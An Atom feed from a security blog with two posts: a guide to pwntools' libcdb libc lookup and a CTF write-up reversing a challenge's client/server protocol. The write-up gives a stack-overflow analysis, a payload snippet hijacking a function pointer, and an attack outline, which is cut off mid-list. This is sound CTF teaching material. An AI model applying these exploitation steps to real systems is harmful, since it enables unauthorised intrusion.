<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sp1k3&#39;s Blog</title>
  
  
  <link href="https://the-soloist.github.io/atom.xml" rel="self"/>
  
  <link href="https://the-soloist.github.io/"/>
  <updated>2025-12-17T15:05:33.000Z</updated>
  <id>https://the-soloist.github.io/</id>
  
  <author>
    <name>Sp1k3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>libcdb：pwntools中的LibcSearcher替代功能</title>
    <link href="https://the-soloist.github.io/2025/11/02/pwntools-libcdb/"/>
    <id>https://the-soloist.github.io/2025/11/02/pwntools-libcdb/</id>
    <published>2025-11-02T13:56:23.000Z</published>
    <updated>2025-12-17T15:05:33.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>笔者去年给 pwntools 写了一点小功能，让他能在本地离线的场景下根据泄露出来的地址搜索 libc 版本，不用安装其他的库了。现在终于在正式版本 <a href="https://github.com/Gallopsled/pwntools/releases/tag/4.15.0">4.15.0</a> 中发布了，这里简单分享一下使用方法。</p><h1 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h1><h2 id="fetch：下载-libc-database"><a href="#fetch：下载-libc-database" class="headerlink" title="fetch：下载 libc-database"></a>fetch：下载 libc-database</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn libcdb fetch</span><br></pre></td></tr></table></figure><p><img src="/2025/11/02/pwntools-libcdb/.././pwntools-libcdb/37cce166495405eaed40c5b8a8953e0e.png"></p><p>第一次使用会询问你是否要在 <code>/var/lib/libc-database</code> 目录初始化，输入 yes 之后自动下载</p><p><img src="/2025/11/02/pwntools-libcdb/.././pwntools-libcdb/b2da2bca85d655db028951acb7f0f06a.png"></p><p>之后运行相同的命令会更新 <code>/var/lib/libc-database</code> 的仓库代码</p><p><img src="/2025/11/02/pwntools-libcdb/.././pwntools-libcdb/814669d89b615afb5c206f2354210e9a.png"></p><p>使用 <code>pwn libcdb fetch -u xxx</code> 可以下载&#x2F;更新指定分类的 libc，一般来说 ubuntu 和 debian 就够了</p><p><img src="/2025/11/02/pwntools-libcdb/.././pwntools-libcdb/e2cd3e27f842479a346370c249fb03e7.png"></p><h2 id="file：查看-libc-的信息"><a href="#file：查看-libc-的信息" class="headerlink" title="file：查看 libc 的信息"></a>file：查看 libc 的信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn libcdb file xxx</span><br></pre></td></tr></table></figure><p><img src="/2025/11/02/pwntools-libcdb/.././pwntools-libcdb/c4725ba5736883d91c9872ca60d70eda.png"></p><h2 id="lookup：搜索偏移"><a href="#lookup：搜索偏移" class="headerlink" title="lookup：搜索偏移"></a>lookup：搜索偏移</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn libcdb lookup</span><br></pre></td></tr></table></figure><p>添加 <code>--offline-only</code> 实现离线搜索</p><p><img src="/2025/11/02/pwntools-libcdb/.././pwntools-libcdb/a2951690fb8ceadff39fae4e9af69727.png"></p><h2 id="hash：搜索指定-hash-的-libc"><a href="#hash：搜索指定-hash-的-libc" class="headerlink" title="hash：搜索指定 hash 的 libc"></a>hash：搜索指定 hash 的 libc</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn libcdb <span class="built_in">hash</span></span><br></pre></td></tr></table></figure><p><img src="/2025/11/02/pwntools-libcdb/.././pwntools-libcdb/1bedca72b60f6e2a0af4105eeaff2a32.png"></p><p>这个功能会默认尝试 unstrip 恢复 libc 的符号，想完全离线需要同时添加 <code>--offline-only --no-unstrip</code> 参数</p><h1 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h1><h2 id="导入方式"><a href="#导入方式" class="headerlink" title="导入方式"></a>导入方式</h2><p>和正常的导入方法一样 import 即可</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><h2 id="相关接口"><a href="#相关接口" class="headerlink" title="相关接口"></a>相关接口</h2><h3 id="search-by-symbol-offsets"><a href="#search-by-symbol-offsets" class="headerlink" title="search_by_symbol_offsets"></a>search_by_symbol_offsets</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">res = libcdb.search_by_symbol_offsets(&#123;<span class="string">&quot;puts&quot;</span>: <span class="number">0xe50</span>, <span class="string">&quot;printf&quot;</span>: <span class="number">0x6f0</span>, <span class="string">&quot;dup2&quot;</span>: <span class="number">0x010</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p><img src="/2025/11/02/pwntools-libcdb/.././pwntools-libcdb/8d9e07ec6e44d54fe64ab5b0bfc37b97.png"><br>也可以离线搜索并直接选择 index</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">path = libcdb.search_by_symbol_offsets(</span><br><span class="line">    &#123;<span class="string">&quot;puts&quot;</span>: <span class="number">0xe50</span>, <span class="string">&quot;printf&quot;</span>: <span class="number">0x6f0</span>, <span class="string">&quot;dup2&quot;</span>: <span class="number">0x010</span>&#125;,</span><br><span class="line">    select_index=<span class="number">1</span>,</span><br><span class="line">    offline_only=<span class="literal">True</span>,</span><br><span class="line">)</span><br><span class="line">libc = ELF(path)</span><br><span class="line"><span class="built_in">print</span>(libc)</span><br></pre></td></tr></table></figure><p><img src="/2025/11/02/pwntools-libcdb/.././pwntools-libcdb/ffff9e2f961a50f56b50703700c2b4db.png"></p><h3 id="search-by-hash-系列"><a href="#search-by-hash-系列" class="headerlink" title="search_by_hash 系列"></a>search_by_hash 系列</h3><p>有这几个函数，调用方法都是一样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search_by_libs_id</span><br><span class="line">search_by_md5</span><br><span class="line">search_by_sha1</span><br><span class="line">search_by_sha256</span><br></pre></td></tr></table></figure><p>这里以 <code>search_by_md5</code> 举例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">res = libcdb.search_by_md5(<span class="string">&quot;4a2402572cbe5f090b6c2a4c24c5e5e8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p><img src="/2025/11/02/pwntools-libcdb/.././pwntools-libcdb/276524245eefe9577a149fdaf769a9ab.png"></p><p>添加如下参数可以完全离线</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">path = libcdb.search_by_md5(</span><br><span class="line">    <span class="string">&quot;4a2402572cbe5f090b6c2a4c24c5e5e8&quot;</span>,</span><br><span class="line">    offline_only=<span class="literal">True</span>,</span><br><span class="line">    unstrip=<span class="literal">False</span>,</span><br><span class="line">)</span><br><span class="line">libc = ELF(path)</span><br><span class="line"><span class="built_in">print</span>(libc)</span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>更多详细用法参考官方文档</p><ul><li><a href="https://docs.pwntools.com/en/latest/libcdb.html">https://docs.pwntools.com/en/latest/libcdb.html</a></li><li><a href="https://docs.pwntools.com/en/latest/commandline.html">https://docs.pwntools.com/en/latest/commandline.html</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;笔者去年给 pwntools 写了一点小功能，让他能在本地离线的场景下根据泄露出来的地址搜索 libc 版本，不用安装其他的库了。现在终于在</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://the-soloist.github.io/tag/CTF/"/>
    
    <category term="pwntools" scheme="https://the-soloist.github.io/tag/pwntools/"/>
    
  </entry>
  
  <entry>
    <title>利用AI复现2025强网拟态初赛2解IoT题目：Poor communication protocol</title>
    <link href="https://the-soloist.github.io/2025/11/02/2025-qwnt-quals-iot2-wp/"/>
    <id>https://the-soloist.github.io/2025/11/02/2025-qwnt-quals-iot2-wp/</id>
    <published>2025-11-02T11:53:02.000Z</published>
    <updated>2025-12-17T15:05:33.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文进行一次利用 AI 从没看到独立复现 2 解题目的尝试，这里分享一下思路。题目本身的主要难度在逆向层面，需要分析每一个指令的参数和功能，并能找到指令中的漏洞</p><h1 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>拿到题目之后看一下基本信息，docker 里在后台运行了 bin&#x2F;server 程序，然后 xinetd 监听 8888 端口，启动 bin&#x2F;client 程序。我们需要使用 nc 和 client 交互，client 再和 server 交互。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── bin</span><br><span class="line">│   ├── client</span><br><span class="line">│   └── server</span><br><span class="line">├── ctf.xinetd</span><br><span class="line">├── docker-compose.yml</span><br><span class="line">├── dockerfile</span><br><span class="line">└── start.sh</span><br></pre></td></tr></table></figure><p>先 nc 上去看一下，这里是提前看了下字符串随便试了试，看起来像是从 client 向 server 发送 cmd 指令</p><p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/7991866d62dc1e8f1a75b30f47fdb26a.png"></p><p>经过几轮对话，让 AI 分析 client&#x2F;server 的逻辑，基本功能就比较清晰了</p><ul><li>server：接收到数据包后通过使用 handle_client_protocol 函数解析，具体 CMD 使用 dispatch_command_handler 处理，根据 CMD ID 进入不同的逻辑<br><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/98e450d36d85b7188cc12fd2fd5f5723.png">​</li><li>client：封装用户指令成数据包后和 server 交互<br><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/96ff8749d02dea2268375fa6f1d29c03.png">​</li></ul><h2 id="CMD-ID-表格"><a href="#CMD-ID-表格" class="headerlink" title="CMD ID 表格"></a>CMD ID 表格</h2><p>接下来我们去分析根据 client 程序中分析每一个 CMD 对应的 ID，不过 AI 一开始并没有给出每一个命令对应的 ID，我们需要人工干预一下。</p><p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/a5d2bdc2bbfa35126cad099a2fbf1172.png"><br>继续让 AI 整理一下这两张表就有</p><table><thead><tr><th>命令名称</th><th>命令 ID</th><th>功能描述</th><th>参数说明</th><th>数据包格式</th></tr></thead><tbody><tr><td>help</td><td>-</td><td>显示帮助信息</td><td>无参数</td><td>无</td></tr><tr><td>hello</td><td>1</td><td>发送 hello 消息</td><td>​[client_name]​（可选，默认为”client”）</td><td>​[client_name]​</td></tr><tr><td>register</td><td>16</td><td>注册操作（字符串方式）</td><td>​<string_data>​</td><td>​[4B 长度][数据]​</td></tr><tr><td>register_hex</td><td>16</td><td>注册操作（十六进制方式）</td><td>​<hex_string>​</td><td>​[4B 长度][数据]​</td></tr><tr><td>list</td><td>22</td><td>列出所有项目</td><td>无参数</td><td>无</td></tr><tr><td>partial_delete</td><td>19</td><td>部分删除操作</td><td>​<id1> <id2>​</td><td>​[4B id1][4B id2]​</td></tr><tr><td>show</td><td>20</td><td>显示指定项目</td><td>​<id>​</td><td>​[4B id]​</td></tr><tr><td>update</td><td>17</td><td>更新操作</td><td>​<id1> <id2> <hex_string>​</td><td>​[4B id1][4B id2][4B 长度][数据]​</td></tr><tr><td>exec</td><td>18</td><td>执行命令</td><td>​<id> <param> <string>​</td><td>​[4B id][2B param][4B 长度][数据]​</td></tr><tr><td>exechex</td><td>18</td><td>执行命令（十六进制参数）</td><td>​<id> <param> <hex_string>​</td><td>​[4B id][2B param][4B 长度][数据]​</td></tr><tr><td>execf</td><td>18</td><td>执行命令（带指针参数）</td><td>​<id> <param> [ptr_hex]​</td><td>​[4B id][2B param][4B 长度][数据]​</td></tr><tr><td>oracle_unlock</td><td>-</td><td>Oracle 解锁功能</td><td>无参数</td><td>无</td></tr><tr><td>oracle_guess</td><td>18</td><td>Oracle 猜测字节</td><td>​<pid> <idx> &lt;0x00..0xff&gt;​</td><td>​[4B pid][2B 0x3733][4B 长度][payload]​</td></tr><tr><td>oracle_leak</td><td>18</td><td>Oracle 泄露字节</td><td>​<id> [size]​（默认 size&#x3D;8）</td><td>​[4B id][4B长度][数据]​</td></tr><tr><td>bye</td><td>255</td><td>退出程序</td><td>无参数</td><td>无</td></tr></tbody></table><h2 id="CMD-功能分析"><a href="#CMD-功能分析" class="headerlink" title="CMD 功能分析"></a>CMD 功能分析</h2><p>CMD 的 ID 和参数格式都有了，接下来分析每个指令的详细功能</p><h3 id="指令功能"><a href="#指令功能" class="headerlink" title="指令功能"></a>指令功能</h3><h4 id="CMD-1-hello"><a href="#CMD-1-hello" class="headerlink" title="CMD 1: hello"></a>CMD 1: hello</h4><p>功能 : 初始化会话并生成会话密钥</p><ul><li>从客户端数据中提取客户端名称</li><li>生成一个随机的会话密钥(generate_session_key​)</li><li>将会话密钥存储在 SessionManager​ 中</li><li>设置响应状态码为 2</li><li>返回 8 字节的会话密钥(大端序)和 “WELCOME” 字符串</li><li>输出会话密钥到 stdout(十六进制格式)</li></ul><p>关键代码路径 :</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session_key = <span class="built_in">generate_session_key</span>(qword_FA40);</span><br><span class="line">*a8 = session_key;  <span class="comment">// 存储会话密钥</span></span><br><span class="line">*a9 = session_key;</span><br><span class="line">srv-&gt;session_mgr-&gt;session_key = session_key;</span><br><span class="line">*a10 = <span class="number">2</span>;  <span class="comment">// 状态码</span></span><br><span class="line"><span class="comment">// 返回: [8字节会话密钥] + &quot;WELCOME&quot;</span></span><br></pre></td></tr></table></figure><h4 id="CMD-16-register"><a href="#CMD-16-register" class="headerlink" title="CMD 16: register"></a>CMD 16: register</h4><p>功能 : 注册一个新的 Profile</p><ul><li>读取客户端发送的字符串数据(长度 ≥ 4 字节)</li><li>验证数据长度是否充足</li><li>计算数据的 CRC 32 校验值</li><li>与固定值 0 x 13579 BDF​ 异或后比较校验和</li><li>如果校验通过,设置会话管理器的标志位</li><li>调用 create_profile​ 创建新的 Profile</li><li>返回 “OK” + 4 字节的 Profile ID</li></ul><p>关键验证逻辑 :</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">crc32_value = <span class="built_in">calculate_crc32</span>(data, length);</span><br><span class="line"><span class="keyword">if</span> ((session_mgr-&gt;session_key ^ <span class="number">0x13579BDF</span>) == crc32_value) &#123;</span><br><span class="line">    session_mgr-&gt;session_key |= <span class="number">0x0100</span>;  <span class="comment">// 设置标志位</span></span><br><span class="line">    profile_id = <span class="built_in">create_profile</span>(session_mgr, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回 : “OK” + [4 字节 Profile ID]​</p><h4 id="CMD-19-partial-delete"><a href="#CMD-19-partial-delete" class="headerlink" title="CMD 19: partial_delete"></a>CMD 19: partial_delete</h4><p>功能 : 删除指定 Profile 中的指定 Blob</p><ul><li>检查是否已经使用过此命令(只能使用一次)</li><li>读取两个 4 字节参数: id 1​(Profile ID) 和 id 2​(Blob ID)</li><li>查找对应的 Profile</li><li>在 Profile 的 Blob 列表中查找指定的 Blob</li><li>将 Blob 的第二个 vector 清空(通过设置 end &#x3D; start)</li><li>设置一个标志表示已删除</li><li>随机分配 0-2 个虚假的内存块(大小 8-71 字节)后立即释放</li><li>返回 “Delete done”</li></ul><p>关键限制 :</p><ul><li>LOBYTE(session_mgr-&gt;session_key) &#x3D;&#x3D; 0​ 必须为真(只能调用一次)</li><li>调用后设置 LOBYTE(session_mgr-&gt;session_key) &#x3D; 1​</li></ul><p>可能的漏洞点 : Blob 的 end 指针被设置为 start,但内存未释放,可能导致 Use-After-Free</p><h4 id="CMD-20-show"><a href="#CMD-20-show" class="headerlink" title="CMD 20: show"></a>CMD 20: show</h4><p>功能 : 显示指定 Profile 的所有 Blob 数据</p><ul><li>读取 4 字节的 Profile ID</li><li>查找对应的 Profile</li><li>检查 Profile 是否被标记为已删除(*(v 117 + 64) !&#x3D; 0​)</li><li>将所有 Blob 的数据拼接后返回</li><li>返回: “OK” + [4 字节总长度] + [所有 Blob 数据]​</li></ul><p>数据格式 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;OK&quot; + [4B length] + [blob1_data][blob2_data]...</span><br></pre></td></tr></table></figure><h4 id="CMD-17-update"><a href="#CMD-17-update" class="headerlink" title="CMD 17: update"></a>CMD 17: update</h4><p>功能 : 更新或创建 Blob</p><ul><li>读取参数: id 1​(Profile ID), id 2​(Blob ID), data​</li><li>查找对应的 Profile 和 Blob</li><li>如果 Blob 存在,更新其数据</li><li>如果 Blob 不存在且数量 &lt; 64,创建新 Blob</li><li>分配 0-2 个随机大小的内存块(8-71 字节)后立即释放</li><li>返回 “OK” + 原始的 id 1 和 id 2</li></ul><p>Blob 数量限制 : 最多 64 个((v 152 - v 151) &lt;&#x3D; 0 x 3 F​)</p><h4 id="CMD-18-exec-exechex-execf"><a href="#CMD-18-exec-exechex-execf" class="headerlink" title="CMD 18: exec&#x2F;exechex&#x2F;execf"></a>CMD 18: exec&#x2F;exechex&#x2F;execf</h4><p>功能 : 执行操作或验证魔术字节</p><ul><li>读取参数: id​(4 B), param​(2 B), data​</li><li>验证数据长度</li><li>如果 param &#x3D;&#x3D; 0 x 1337​ 且会话已解锁:<ul><li>调用 verify_magic_bytes​ (Oracle 相关)</li></ul></li><li>否则调用 execute_operation​</li><li>返回 “OK: “ 或 “ERR: “ + 结果信息</li></ul><p>特殊参数 0 x 1337: Oracle 解锁功能的入口</p><p>Oracle 相关 :</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">BYTE1</span>(session_mgr-&gt;session_key) &amp;&amp; param == <span class="number">0x1337</span>) &#123;</span><br><span class="line">    <span class="built_in">verify_magic_bytes</span>(srv, id, &amp;data, &amp;result, session_key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="CMD-22-list"><a href="#CMD-22-list" class="headerlink" title="CMD 22: list"></a>CMD 22: list</h4><p>功能 : 列出所有 Profile ID</p><ul><li>遍历 SessionManager​ 中的 Profile 红黑树</li><li>收集所有 Profile 的 ID</li><li>返回: [4 字节数量] + [ID 1][ID 2]…[IDn]​</li></ul><p>返回格式 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[4B count] + [4B id1] + [4B id2] + ... + [4B idn]</span><br></pre></td></tr></table></figure><h4 id="CMD-255-a-2-1-bye"><a href="#CMD-255-a-2-1-bye" class="headerlink" title="CMD 255 (a 2 &#x3D;&#x3D; -1): bye"></a>CMD 255 (a 2 &#x3D;&#x3D; -1): bye</h4><p>功能 : 断开连接</p><ul><li>返回 “BYE” 字符串</li><li>设置状态码为 3,指示服务器关闭连接</li></ul><h3 id="Oracle-系列"><a href="#Oracle-系列" class="headerlink" title="Oracle 系列"></a>Oracle 系列</h3><p>在表格里看到了一些比较奇怪的指令，重点测试 oracle 和 exec</p><p>在执行这个 oracle 指令之前需要先 oracle_unlock 解锁功能，笔者发现 <code>​oracle_leak idx 8​</code> 可以泄露出基地址，这里的 idx 是通过 register 注册的索引</p><p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/7215f1d925ac7067f24885c767bf0c09.png">​</p><h3 id="Exec-系列"><a href="#Exec-系列" class="headerlink" title="Exec 系列"></a>Exec 系列</h3><p>测试的时候发现 exec 系列不知道怎么调用，继续让 AI 分析</p><p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/b273bc9bd1b968e37fb7192efb818eae.png"><br><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/26d9a60ba51e5b55f9649ad911c6ee85.png"></p><p>这里因为不知道 param 和 op_type 是怎么传的，所以需要调试一下，在 0000000000005F6B 下断点，然后执行 <code>exechex 1 2 aabbccddeeff</code></p><p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/5dafe6d923f8c7d97cff465979ffa05d.png"></p><p>结合代码能看出来 op_type 是 data 部分的第一个字节，接着 4 字节是最后 payload 的长度</p><p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/c03d71e7860574bf2c65bb068e8d50b2.png"></p><p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/c4e85927ddf969b9e4ac475c02984da4.png"><br>成功执行</p><p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/c59f3c95ffd1930b9e0b0577afaac4b6.png"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在对话的过程中顺带帮我分析出来了一个栈溢出漏洞，还给出了栈布局</p><p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/902006893380973c0b1ad9e4422d3cd2.png"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">High Address</span><br><span class="line">┌─────────────────────────────────────────────────┐</span><br><span class="line">│                                                 │</span><br><span class="line">│  Caller&#x27;s Stack Frame                           │</span><br><span class="line">│                                                 │</span><br><span class="line">├─────────────────────────────────────────────────┤ &lt;- rbp+0x10</span><br><span class="line">│  Return Address (8 bytes)                       │ &lt;- rbp+0x08  [TARGET!]</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  Saved RBP (8 bytes)                            │ &lt;- rbp+0x00</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  var_40: Stack Canary (8 bytes)                 │ &lt;- rbp-0x40</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  var_50: v37 (int, 4 bytes)                     │ &lt;- rbp-0x50</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  var_51: v36 (char, 1 byte)                     │ &lt;- rbp-0x51</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  ...other local variables...                    │</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  var_148: v35 (function pointer, 8 bytes)       │ &lt;- rbp-0x148</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│                                                 │</span><br><span class="line">│  dest[64]: Target Buffer                        │ &lt;- rbp-0x188</span><br><span class="line">│  ┌──────────────────────────────────┐           │</span><br><span class="line">│  │ 64 bytes buffer                  │           │</span><br><span class="line">│  │ (but we copy up to 312 bytes!)   │           │</span><br><span class="line">│  └──────────────────────────────────┘           │</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  src: __m128i (16 bytes)                        │ &lt;- rbp-0x198</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  n: size_t (8 bytes)                            │ &lt;- rbp-0x1A0</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  p_src: void* (8 bytes)                         │ &lt;- rbp-0x1A8</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  ...more variables...                           │</span><br><span class="line">└─────────────────────────────────────────────────┘</span><br><span class="line">Low Address</span><br><span class="line"></span><br><span class="line">Distance calculations:</span><br><span class="line">- dest to saved rbp: 0x188 = 392 bytes</span><br><span class="line">- dest to return addr: 0x188 + 8 = 400 bytes</span><br><span class="line">- Overflow space: 312 - 64 = 248 bytes</span><br><span class="line">- Can overwrite: 248 bytes beyond dest[64]</span><br></pre></td></tr></table></figure><p>不过他认为可以修改返回地址，但这实际上是修改不到的，因为我们只能写入 0x140</p><p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/3d5f4e6d6859f0833542c5e7360722b5.png"></p><p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/cab56204f4b5709805376865041cbbbf.png"></p><p>指出这一点之后，AI 分析出来 v35 指针可以利用，也就是</p><p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/04c80251b2ba4ee2d1139045186ace90.png"></p><p>测试之后发现成功控制了 call rax​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x140</span>)</span><br><span class="line">data = p8(<span class="number">0x41</span>) + p32(<span class="built_in">len</span>(payload)) + payload</span><br><span class="line">run(<span class="string">f&quot;exechex <span class="subst">&#123;idx&#125;</span> 2 <span class="subst">&#123;binascii.hexlify(data).decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/a16628cda00baadf2466f781c1c2dee7.png"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>在所有的指令功能都分析完之后，其实已经比较清晰了，先用 oracle 泄露地址，然后在利用 exec 的栈溢出漏洞。</p><p>AI 也给了攻击流程，和最终实现的 exp 已经没有太大差别了</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────────────────────────────────────────────┐</span><br><span class="line">│                  攻击流程                            │</span><br><span class="line">└─────────────────────────────────────────────────────┘</span><br><span class="line"></span><br><span class="line">1. CMD_HELLO (0x01)</span><br><span class="line">   ↓</span><br><span class="line">   获取 session_key</span><br><span class="line">   ↓</span><br><span class="line">2. CMD_REGISTER_PROFILE (0x10)</span><br><span class="line">   ↓</span><br><span class="line">   认证成功 (oracle_unlock)</span><br><span class="line">   ↓</span><br><span class="line">3. oracle_guess (CMD_EXEC_OP 